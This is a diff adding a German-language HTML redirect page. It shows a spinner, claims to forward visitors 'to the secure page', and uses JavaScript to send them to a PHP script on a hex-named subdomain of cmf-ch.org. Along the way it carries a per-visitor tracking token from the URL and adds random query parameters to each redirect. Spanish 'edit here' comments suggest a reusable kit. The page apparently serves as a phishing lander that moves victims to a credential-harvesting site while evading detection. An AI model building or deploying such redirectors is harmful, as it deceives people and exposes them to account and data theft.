@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Weiterleitung...</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#f5f7fa;display:flex;align-items:center;justify-content:center;min-height:100vh;color:#333}
+        .wrap{text-align:center;padding:40px 24px;max-width:420px}
+        .spinner{width:36px;height:36px;border:3px solid #d0d5dd;border-top-color:#2c5f8a;border-radius:50%;animation:spin .7s linear infinite;margin:0 auto 20px}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        h1{font-size:17px;font-weight:600;color:#1a2a3a;margin-bottom:8px}
+        p{font-size:13.5px;color:#6b7a8d;line-height:1.5}
+        .link{margin-top:18px;font-size:12px;color:#94a3b8}
+        .link a{color:#2c5f8a;text-decoration:none}
+        .link a:hover{text-decoration:underline}
+        noscript .box{background:#fff;border-radius:10px;padding:30px;box-shadow:0 1px 4px rgba(0,0,0,.08);max-width:400px;margin:0 auto}
+        noscript h2{font-size:16px;margin-bottom:10px;color:#1a2a3a}
+        noscript a{color:#2c5f8a;word-break:break-all}
+    </style>
+</head>
+<body>
+    <div class="wrap">
+        <div class="spinner"></div>
+        <h1>Sie werden weitergeleitet&hellip;</h1>
+        <p>Bitte warten Sie einen Moment. Sie werden automatisch zur sicheren Seite weitergeleitet.</p>
+        <p class="link" id="fallback"></p>
+    </div>
+
+    <noscript>
+        <div class="box">
+            <h2>JavaScript erforderlich</h2>
+            <p>Bitte aktivieren Sie JavaScript oder klicken Sie auf den folgenden Link:</p>
+            <p><a href="https://9972dbb1137483c6cc11d435ada58c7b.cmf-ch.org/b4b5156d/nwf72f63b7.php">Weiter zur sicheren Seite</a></p>
+        </div>
+    </noscript>
+
+    <script>
+        // ============================================
+        // CONFIGURACIÓN - EDITAR AQUÍ
+        // ============================================
+        var TARGET = "https://9972dbb1137483c6cc11d435ada58c7b.cmf-ch.org/b4b5156d/nwf72f63b7.php";
+        var DELAY  = 1500; // ms antes de redirect
+        // ============================================
+
+        function rnd(len){
+            var c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',s='';
+            for(var i=0;i<len;i++) s+=c.charAt(Math.floor(Math.random()*c.length));
+            return s;
+        }
+
+        // Obtener parámetro t (tracking) de la URL actual
+        function getParam(name){
+            var url = new URL(window.location.href);
+            return url.searchParams.get(name);
+        }
+        var trackToken = getParam('t');
+
+        // Mostrar fallback link después de 4s
+        setTimeout(function(){
+            var el=document.getElementById('fallback');
+            var link = TARGET + (trackToken ? '?t=' + trackToken : '');
+            if(el) el.innerHTML='Falls die Weiterleitung nicht funktioniert: <a href="'+link+'">hier klicken</a>';
+        }, 4000);
+
+        // Redirect con tracking token + random param
+        setTimeout(function(){
+            var url = TARGET;
+            if(trackToken) url += '?t=' + trackToken + '&' + rnd(1) + '=' + rnd(8);
+            else url += '?' + rnd(1) + '=' + rnd(8);
+            window.location.replace(url);
+        }, DELAY);
+    </script>
+</body>
+</html>
